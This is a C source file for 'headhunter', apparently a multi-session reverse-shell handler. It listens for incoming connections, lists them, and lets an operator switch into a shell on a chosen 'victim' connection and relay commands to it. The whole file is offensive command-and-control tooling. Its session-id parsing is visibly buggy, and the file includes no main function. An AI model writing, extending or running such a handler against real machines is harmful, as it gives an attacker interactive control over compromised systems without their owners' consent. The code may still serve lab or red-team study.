#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <errno.h>
#include <ctype.h>
#define MAXBUF 65536
#define BACKLOG 1
#define MAX_CLIENTS 30


fd_set readfds;
int master_socket, new_socket, max_clients = MAX_CLIENTS, client_socket[MAX_CLIENTS], activity, i, sd;
int max_sd;
struct sockaddr_in cli;
socklen_t len;

// Declaration of struct "args" as the pthread_create function preferably takes a struct as a param
// This is the struct for the Writer thread
typedef struct args
{
	int src;
	int dest;
} args;

char *get_socket_addr(int socket_descriptor){
    getpeername(socket_descriptor, (struct sockaddr *)&cli, &len);
    // printf("Connection received with %s\n\n", inet_ntoa(cli.sin_addr));

    return inet_ntoa(cli.sin_addr);
}
// Declaration of a thread routine that will be called by pthread for reading from stdin on server and write to the victim file descriptor
void *Acceptor(void *arg){
	FD_SET(master_socket, &readfds);  // assigned master socket to the set
	for (i = 0; i < max_clients; i++)  // sets array of socket fds to zero so not read
		client_socket[i] = 0;

	while(1){
		FD_ZERO(&readfds);
		FD_SET(master_socket, &readfds);
		max_sd = master_socket;

		// add child sockets to set
		for ( i = 0 ; i < max_clients ; i++){
			// socket descriptor
			sd = client_socket[i];

			// if valid socket descriptor then add to read list
			if(sd > 0)
				FD_SET( sd , &readfds);

			// highest file descriptor number, need it for the select function
			if(sd > max_sd)
				max_sd = sd;	  
		}

		// wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
		activity = select( max_sd + 1, &readfds, NULL, NULL, NULL);

		if ((activity < 0) && (errno!=EINTR)) {}

		if (FD_ISSET(master_socket, &readfds)) {

			//wait for an activity on one of the sockets , timeout is NULL , so wait indefinitely
			activity = select( max_sd + 1 , &readfds , NULL , NULL , NULL);

			if ((activity < 0) && (errno!=EINTR)) {}

			if (FD_ISSET(master_socket, &readfds)) {
				if ((new_socket = accept(master_socket, (struct sockaddr *)&cli, &len))<0){
					perror("accept");
                    printf("Exiting due to a socket failure...\n");
                    fflush(NULL); sync();
					exit(EXIT_FAILURE);
				}
				// add new socket to an array of sockets

				for (i = 0; i < max_clients; i++) {

					// only if position is empty
					if( client_socket[i] == 0 ){

						client_socket[i] = new_socket;
						// getpeername(new_socket, (struct sockaddr *)&cli, &len);
						// printf("Connection received with %s\n\n", inet_ntoa(cli.sin_addr));
                        printf("Connection received with %s\n\n", get_socket_addr(new_socket));

						break;
					}
				}
			}
		}
	}
}

int str_starts_with(char *a, char*b){
    for(int i = 0; i < strlen(b); i++){
        if (a[i] != b[i])
            return 0;
    }
    return 1;
}

int server_control_session(args *a){
    fflush(NULL);
    int n;
    char buffer[MAXBUF];
    int selected_id;

    while(1){
        while((n = read(a->src, buffer, MAXBUF)) > 0){
            if (strcmp(buffer, "help\n") == 0) {
                printf("Showing all help commands:\n");
                printf(">help                   |  List all available commands\n");
                printf(">list connections       |  List active connections\n");
                printf(">shell <connection id>  |  Switch session to specified connection by id\n");
                printf(">exit                   |  Close headhunter\n");
                printf("***********************************************************************\n");
            } else if (strcmp(buffer, "list connections\n") == 0) {
                printf("Current connections:\nID  |  Address\n--------------\n");
                for (int i = 0; i < max_clients; i++){
                    if (client_socket[i] == 0){ continue; }  // Continue just in case there is a random NULL socket
                    printf("%3d |  %s\n", client_socket[i], get_socket_addr(client_socket[i]));
                }
                printf("--------------\n");
            } else if (str_starts_with(buffer, "shell") == 1) {
                selected_id = 0;

                for (int c = 6; c < strlen(buffer); c++){
                    if (isdigit(buffer[c])) {
                        // printf("+(%d)*(%lu)", ((int) buffer[c] - 48), (strlen(buffer) - 7));
                        selected_id += ((int) buffer[c] - 48) * (strlen(buffer) - 7);
                    }
                }
                printf("Exiting server control session...\n");
                printf("Entering control session with id '%d'...\n", selected_id);
                if (selected_id >= MAX_CLIENTS || selected_id < 0) {
                    printf("Invalid id!\nBuffer received:\n");
                    printf("%s\n", buffer);
                    printf("END OF BUFFER\n");
                    continue;
                }
                a->dest = selected_id;
                return selected_id;
            } else if (strcmp(buffer, "exit\n") == 0){
                printf("Exiting server control session...\n");
                return -1;
            } else {
                printf("Unknown command. Enter 'help' for list of available commands.\n");
            }
            printf("headhunter>");
            fflush(NULL);
            for (int i = 0; i < MAXBUF; i++){ buffer[i] = NULL; }  // Clear buffer
        }
        printf("The program is bad\n");
        fflush(NULL); sync();
    }
}

void *Writer(void *arg)
{
	args a = *(args *)arg;
	int n;
	char buffer[MAXBUF];
    int action;

	while ((n = read(a.src, buffer, MAXBUF - 1)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
    {
        fflush(NULL);
        if (strcmp(buffer, "!exit\n") == 0) {
            printf("Current a.dest: '%d'\n", a.dest);
            printf("headhunter>");
            while (fflush(NULL) != 0) {}
            action = server_control_session(&a);  // pause writing from connections and enter sever control session

            if (action == -1){
                printf("Exiting Writer thread...\n");
                return NULL;
            }
            a.dest = action;

            printf("%d$", a.dest);
            fflush(NULL);
            continue;
        } else if(strcmp(buffer, "exit\n") == 0){
            printf("Exiting...\n");
            client_socket[i] = 0;

            action = server_control_session(&a);  // pause writing from connections and enter sever control session

            if (action == -1){
                printf("Exiting Writer thread...\n");
                return NULL;
            }
            a.dest = action;

            printf("%d$", a.dest);
            fflush(NULL);
            continue;
        } else {
            sync();
            write(a.dest, buffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 123
            sync();
        }
    }

	if (n == -1)
		printf("Error in function thread read()\n");

	return NULL;
}

int CreateServerSocket(char *address, char *port, int *type, int *family)
{
	int sockfd, gai_error;
	struct addrinfo hints, *servinfo, *p;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = *family;   // passes parameters called into a struct
	hints.ai_socktype = *type;
	hints.ai_flags = AI_PASSIVE;

	if ((gai_error = getaddrinfo(address, port, &hints, &servinfo)) != 0)
	{
		fprintf(stderr, "Error in getaddrinfo(): %s\n", gai_strerror(gai_error));
		exit(0);
	}

	for (p = servinfo; p != NULL; p = p->ai_next)
	{
		sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);

		if (sockfd == -1)
		{
			perror("Error in socket()");
			continue;
		}

		if (*type == SOCK_STREAM)
		{
			int sockopt = setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));

			if (sockopt == -1)
			{
				printf("Error in function setsockopt\n");
			}
		}

		// binds socket
		if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1)
		{
			close(sockfd);
			perror("Error in bind()");
			continue;
		}

		break;
	}

	if (p == NULL)
	{
		printf("Error could not bind\n");
		exit(0);
	}

	// starts listening for incoming connections
	if (*type == SOCK_STREAM && listen(sockfd, BACKLOG) == -1)
	{
		printf("Error in function listen\n");
	}

	freeaddrinfo(servinfo);
	printf("Listener started... awaiting connection\n\n");
	return sockfd;
}

int have_connections(){
    for (int i = 0; i < MAX_CLIENTS; i++){
        if (client_socket[i] != 0){
            return 1;
        }
    }
    return 0;
}

int get_sockd_index(int sockd){
    for (int i = 0; i < MAX_CLIENTS; i++){
        printf("{%d}%d\n", i, client_socket[i]);
        if (client_socket[i] == sockd){
            return i;
        }
    }
    return -1;
}

void connection_display(args *a, char *buffer) {
	printf("connection display!\n");

    int action;
    int n;

	n = read(a->dest, buffer,MAXBUF);
	write(STDOUT_FILENO, buffer, n);
    printf("%d>", a->dest);
    fflush(NULL);
    while (have_connections()){
        while ((n = read(a->dest, buffer, MAXBUF)) > 0) {
            sync();
            if (write(STDOUT_FILENO, buffer, n) == -1)  // writes data from victim fd to stdout
                printf("Error in function write()\n");
            printf("%d>", a->dest);
            sync();
            fflush(NULL);
        }

        action = server_control_session(a);
        a->dest = action;

        printf("%d>", a->dest);
        fflush(NULL);

        printf("Waiting...%d | %d\n", a->dest, get_sockd_index(a->dest));
        sleep(1);
    }
    printf("No more connections. Exiting...\n");
    fflush(NULL); sync();

	if (n == -1)
        printf("Error in function read()\n");
}

void Server(char *address, char *port, int *type, int *family)
{
	args a;
	char buffer[MAXBUF];
	pthread_t printer;
	pthread_t acceptor;

	// calls function to create server socket then returns server file descriptor
	master_socket = CreateServerSocket(address, port, type, family);

	// create an acceptor child process to accept incoming connections
	if (pthread_create(&acceptor, NULL, Acceptor, (void *)&a) != 0)
		printf("Error in function pthread_create\n");

	// waits for the first socket to be filled
	while(client_socket[0] == 0){}

	// Passes arguments to the thread struct
	a.src = STDIN_FILENO;
	a.dest = client_socket[0];

	// creates thread that will run parallel with the rest of the code to handle connection operations
	if (pthread_create(&printer, NULL, Writer, (void *)&a) != 0)
		printf("Error in function pthread_create\n");

	// reads data from the victim socket, executes code is data is found
    connection_display(&a, buffer);

	// sends a request to stop thread
	pthread_cancel(printer);
	pthread_join(printer, NULL);
	close(master_socket);
	close(a.dest);
    printf("All processes killed. Exiting...\n");
    sync();
    fflush(NULL);
}


